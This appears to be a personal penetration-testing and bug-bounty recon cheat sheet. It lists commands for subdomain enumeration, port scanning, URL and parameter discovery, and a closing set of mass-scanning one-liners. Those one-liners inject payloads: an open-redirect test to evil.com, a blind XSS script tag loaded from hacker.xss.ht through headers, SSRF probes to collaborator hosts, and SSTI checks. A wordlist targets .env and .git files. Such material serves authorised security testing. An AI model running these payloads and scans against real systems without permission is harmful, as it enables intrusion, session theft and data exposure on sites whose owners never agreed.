**Attack Surface defines the whole recon process of penetration testing and web hacking. This very much is controversial due to your scope,
but for the purpose of this document we will pretend everything under a domain is inscope and you will need to apply it if your scope is different**
<br>
<br>

<h1>SUBDOMAIN ENUMERATION</h1><br>
ASN Mapping - asnmap -d STRIPEOLT.COM <br>
Subfinder - (subfinder.py avaliable on github) python3 subfinder.py -d ENTERDOMAIN -o outfile.txt <br>
amass - amass enum -d DOMAIN >> outfile.txt <br>
assetfinder - assetfinder ENTERDOMAIN | grep ENTERDOMAIN >> outfile.txt <br>
sublist3r.py - sublist3r.py -d ENTERDOMAIN >> outfile.txt <br>
crtsh_enum.py domain.com >> outfile.txt <br> (called crtsh.py on my pc)
<br>
censys manual checking. Go to the legit domain website and check the SSL Cert, use the O or CN and serach via hosts or certs on censys, you can filter via ports <br>
We can use censys api on kali using command <br>
censys subdomains domain.com (have to add api key) or use the below <br>
Use uncover for censys IPs to export to nuclei - └─$ uncover -cs "bbc.co.uk"     - uncover -cs "bbc.co.uk" | httpx | nuclei <br>
Or use uncover with ASN range for the company - have to find online - echo ASNNUMBER | uncover | httpx | nuclei <br>
What I also do is go to censys, select hosts, type in the domain name, then top left is ASN section, select the provider and itll show you IP spaces for the company, you can verify any IP's do indeed belong to the company with whois checks and ssl checks <br>
<br>
Wordlist - use https://github.com/six2dez/OneListForAll
<br>
Brute force Subdomains with ffuf -u "https://FUZZ.target.com" -w pathtowordlist -mc 200,301,302,403 <br>
wfuzz -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --sc 200,202,204,301,302,403 -u "https://stripeolt.com" -H "Host:FUZZ.example.com" -t 100 --hw "40" <br>
Use goaltdns to find more subdomains off the back of your file of subdomains <br>
use - mksub -df stripesubfinder.txt -w /usr/share/spiderfoot/spiderfoot/dicts/subdomains.txt | httprobe -p https:443    to find more subs
<br>
<h1> VHOST DIscovery </h1> <br>
copy subdomain file to directory /vhosts-sieve and run python3 vhosts-sieve.py -d file.txt -o file2.txt <br>
<br>


<b>BASH SCRIPTING THIS </b><br>
First make file called subdomains.txt and add all domains in <br>
for i in $(cat subdomains.txt);do Subfinder -d $i >> subdomainsmain.txt;done <br>
for i in $(cat subdomains.txt);do amass enum -d $i >> subdomainsmain.txt;done <br>
for i in $(cat subdomains.txt);do sublist3r -d $i >> subdomainsmain.txt;done <br>
for i in $(cat subdomains.txt);do assetfinder $i | grep $i >> subdomainsmain.txt;done <br>
for i in $(cat subdomains.txt);do python3 crtsh.py $i >> subdomainsmain.txt;done <br>
Move all into one file <br>
<br>
<b> Now use crtsh.py to do subdomain scanning on subdomains to find even more </b> <br>
<br> use hurricane search on an IP address to identify the ASN - https://bgp.he.net/ and then use the whois tab top right to verify
What all this has done is built you a large file of subdomains owned by the company. <br>
Also ensure you do subdomain scanning on found subdomains to get even more unique domains <br>
<br>

<h1>PORT SCANNING</h1><br>
 Now you have a large list, you'll want to see what is alive on the usual https 443 port. I use httprobe for this <br>
cat outfile.txt | httprobe -p https:443 | tee aliveoutfile.txt <br>
You may want to look for non standard ports, you can do this changing the "443" specified above. <br>
NMAP is also useful, I always do a scan across uncommon web ports <br>
nmap -iL outfile.txt -p 8000,8001,8002,8080,8443,5000,5001,88,9000,9001,9111,9011,9002,9090 | tee aliveports.txt
<br>
<br>
<b> Use gowitness to screenshot domains to have a look at whats interesting - gowitness file -f aliveoutfile.txt </b> <br>
<br>
<h1>FINDING URLS</h1><br>
I use several tools for this job and my wordlists come from the following link https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content <br>
or I use the locate command on kali linux if using CLI tools "locate Web-Content" <br>
<br>
**waybackurls <br>
gau <br>
gospider <br>
wfuzz <br>
dirsearch <br>
ffuff <br>
Feroxbuster <br>
JavaScript Link Finder** 
<br>
Extract all js files with gau, burp, waybackurls or gospider and grep for further endpoints - cat file.js | grep -aoP "(?<= (\"|\'|\`))\/[a-zA-z0-9_?&=\/\-\#\.]*(?=(\"|\'|\`))" | sort -u    <br>
Use gospider against subdomain list with gospider -s subdomains.txt -p http:burpproxy <br>


<br> 1 liner for hidden JS endpoints - assetfinder example.com | gau | egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'); echo -e "\e[1;33m$url\n\e[1;32m$vars"; done <br>
<br>
<br>
Another endpoint js method ---- python3 linkfinder.py -i https://example.com/index.js -o cli  <br>
<br>
<h2>Waybackurls</h2><br> is a tool that will scrape the wayback archive for URLS. We use this with GF patterns read here https://github.com/1ndianl33t/Gf-Patterns <br>
waybackurls DOMAIN | tee waybackurls.txt <br>
<br>
**OR** 
<br>
<br>
cat aliveoutfile.txt | waybackurls | tee waybackurls.txt
<br>
<br>
Use one liner for interesting files cat alivesubs.txt | gauplus -subs | grep ".csv" <br>
<br>
<br>
If you want to search for patterns you can use the following <br>
cat aliveoutfile.txt | waybackurls | gf xss |tee waybackurls.txt <br>
replace "xss" with the following patterns <br>
idor<br>
img-traversal<br>
interestingparams<br>
lfi<br>
rce<br>
redirect<br>
sqli<br>
ssrf<br>
ssti<br>
xss<br>
<br>
This will now give you output on URL endpoints that follow those patterns (does not mean you will have any of the vulns, it means you can now poke params for those.
<br>
The exact same is for GAU <br>
gau DOMAIN <br>
cat outfile.txt | gau | gf PATTERN | tee FILE.txt <br>
<br>
<h2>Param discovery</h2> <br>
echo tesla.com | subfinder -silent | httpx -silent | cariddi -intensive <br>
<br>
Do subdomain crawling with go spioder and hakrawler and send to burp with httpx - gospider -S sites.txt -o output -c 10 -d 1 <br>
<br>

Run paramspider on target name or file to discover URLS and parameters - add to file name waybackurls.txt. <br>
Run Arjun on direct URL endpoints to discover further Parameters in the URL request arjun -i subdomains.txt -m GET -oT param.txt <br> 
<br>
<b> You can pass all URLS to Burp using - cat waybackurls.txt | httpx -http-proxy http://proxyaddress:port <br>
 <br>
 From here I like to run exact burp scans across the discovered URLS such as my XSS scan, SSRF, Open redirect etc <br>
 Always grep file types - waybackurls domain.com | grep zip   (can do txt, docx, xslx etc) <br>
<br>
<h2>wfuzz</h2> <br>
output these files using >> urls.txt after each command
wfuzz -w wordlist/general/common.txt http://DOMAIN <br>
https://wfuzz.readthedocs.io/en/latest/user/basicusage.html <br>
<br>
<h2>dirsearch</h2>
dirsearch -d DOMAIN -w WORDLIST --deep-recursive (for recursive) <br>
I like to use this on a bash loop if scanning a file containing subdomains so I will use the following bash script <br>
for i in $(cat aliveoutfile.txt)do; subfinder -d $i;done<br>
This one liner can be used on any script just replace "subfinder" with the tool name then the syntax<br>
<br>
<h2>feroxbuster</h2>
feroxbuster --url DOMAIN -w WORDLIST <br>
<br>
</h2>JavaScript Link Finder</h2> <br>
This is a Burp tool plugin, download this on the BAPP store and it will crawl for further endpoints in Javascript <br>
<br>
You can proxy results from these crawlers into BurpSuite using the -p https://127.0.0.1:8081 syntax (depends what IP your BS and port is active)<br>
dirsearch uses the --proxy= syntax
<br>

Now that you have all URL's, it is advised to run paraminer on the output file you have created for all all subdomains, will need a bash one liner <br>
for i in $(cat aliveoutfile.txt)do; paramspider.py -d $i >> paramspider.txt <br> <br>
Or you can use arjun with the bash one liner - for i in $(cat waybackurls.txt); do arjun -i $i;done <br>
<br>
<br>
<h4>Further Param discovery </h4><br>
Arjun -i aliveoutfile.txt -oT arjun.txt <br>
Move contents of arjun.txt into waybackurls.txt
<br>

<h1>BASH TIME</h1>
Now you have all your files, you want to externally check for vulns <br>
<h4>First I check for Reflected XSS using qsreplace and airixss </h4><br>
cat waybackurls.txt | gf xss | qsreplace '<.test>' | airixss -p "<.test>" (remove the . infront of test)<br>
This will check all urls grepped under the xss catagory for reflection of unfiltered <>tags <br>
Use the same one liner but for url encoder - cat waybackurls.txt | gf xss | qsreplace '%3Ctest%3E' | airixss -p "<.test>" <br>
<br>
 <h4>Open Redirect </h4><br> 
 - cat waybackurls.txt | gf redirect | qsreplace "https://evil.com" | httpx -status-code -location -fc 404,401 <br>
<br>
 <h4>SSRF One Liner </h4><br>
 - Open Burpsuite and go to collab client, copy the value. <br>
cat waybackurls.txt | qsreplace BURPCOLLAB | airixss -p BURPCOLLAB <br>
Here you want to check for the link being reflected and check for HTTP interaction on Burp Collab, if you get a hit, check manually for SSRF
<br> 
 <h4>SSTI One Liner </h4><br>
 - cat waybackurls.txt | qsreplace "test{{7*7}}" | airixss -p "test49" > sstifuzz.txt <br>
 <br>

 <h4>Run Nuclei on your hoste file </h4><br>
for i in $(cat aliveoutfile.txt)do nuclei -u $i;done <br>
<br>
<h4>Secrets finder - "snallygaster" </h4><br>
for i in $(cat aliveoutfile.txt)do snallygaster -h $i;done <br>
<br>
Run socialhunter for social media broken links <br>
<br>
<h4> Blind XSS </h4><br>
subfinder -d target.com | gau | bxss -payload '"><script src=https://hacker.xss.ht></script>' -header "X-Forwarded-For"<br>
<br>
<h4> Blind SSRF </h4><br>
cat domains.txt | assetfinder --subs-only| httprobe | while read url; do xss1=$(curl -s -L $url -H 'X-Forwarded-For: xss.yourburpcollabrotort'|grep xss) xss2=$(curl -s -L $url -H 'X-Forwarded-Host: xss.yourburpcollabrotort'|grep xss) xss3=$(curl -s -L $url -H 'Host: xss.yourburpcollabrotort'|grep xss) xss4=$(curl -s -L $url --request-target http://burpcollaborator/ --max-time 2); echo -e "\e[1;32m$url\e[0m""\n""Method[1] X-Forwarded-For: xss+ssrf => $xss1""\n""Method[2] X-Forwarded-Host: xss+ssrf ==> $xss2""\n""Method[3] Host: xss+ssrf ==> $xss3""\n""Method[4] GET http://xss.yourburpcollabrotort HTTP/1.1 ""\n";done\
<br>
 
<h1>QUICK WINS WORDLIST</h1><br>
/phpinfo.php<br>
/info.php<br>
/admin.php<br>
/api/apidocs<br>
/apidocs<br>
/api<br>
/api/v2<br>
/api/v1<br>
/v2<br>
/package.json<br>
/security.txt<br>
/application.wadl<br>
/api/apidocs<br>
/swagger<br>
/swagger-ui<br>
/swagger-ui.html<br>
/swagger/swagger-ui.html<br>
/api/swagger-ui.html<br>
/v1.x/swagger-ui.html<br>
/swagger/index.html<br>
/graphql<br>
/graphiql<br>
/register<br>
/login<br>
/.git<br>
/.env<br>
/.htaccess<br>
/script<br>
/console<br>







